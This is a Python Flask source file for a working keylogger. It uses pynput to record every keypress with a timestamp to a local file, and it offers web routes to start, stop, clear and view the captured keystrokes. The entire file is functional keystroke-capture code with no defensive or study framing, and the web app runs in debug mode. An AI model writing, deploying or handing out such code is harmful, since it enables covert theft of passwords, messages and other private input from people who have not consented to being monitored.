from flask import Flask, render_template, redirect, url_for
from pynput import keyboard
import threading
from datetime import datetime

app = Flask(__name__)

log_file = "keystrokes.txt"
listener = None
logging_active = False

def start_keylogger():
    global listener

    def on_press(key):
        if not logging_active:
            return
        try:
            key_char = key.char
        except AttributeError:
            key_char = f"[{key}]"

        time_stamp = datetime.now().strftime("%H:%M:%S")
        with open(log_file, "a") as f:
            f.write(f"[{time_stamp}] {key_char}\n")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

@app.route("/")
def index():
    try:
        with open(log_file, "r") as f:
            data = f.read()
    except:
        data = ""
    status = "Logging Active" if logging_active else "Logging Stopped"
    return render_template("index.html", data=data, status=status)

@app.route("/start")
def start():
    global logging_active
    logging_active = True
    start_keylogger()
    return redirect(url_for("index"))

@app.route("/stop")
def stop():
    global logging_active, listener
    logging_active = False
    if listener:
        listener.stop()
    return redirect(url_for("index"))

@app.route("/clear")
def clear():
    open(log_file, "w").close()
    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(debug=True)